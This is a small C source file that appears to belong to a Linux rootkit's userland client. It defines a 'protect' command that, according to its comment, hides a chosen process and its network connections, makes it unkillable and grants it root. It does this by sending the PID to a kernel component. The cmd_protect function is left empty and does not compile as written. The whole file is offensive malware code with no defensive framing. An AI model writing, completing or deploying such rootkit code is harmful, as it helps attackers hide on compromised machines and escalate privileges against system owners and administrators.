#include "../inc/kernel.h"
#include "../inc/cmds.h"

#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <errno.h>

/*

 * protect command "protects" a provided PID
 * which hides the associated process, and its network connections
 * it also makes the process unkillable and gives it root

*/

bool protect_pid(pid_t pid){
  if(pid <= 0)
    return false;
  return kernel_send(KERNEL_CMD_PROTECT, &pid, sizeof(pid_t));
}

bool cmd_protect(job_t){
}
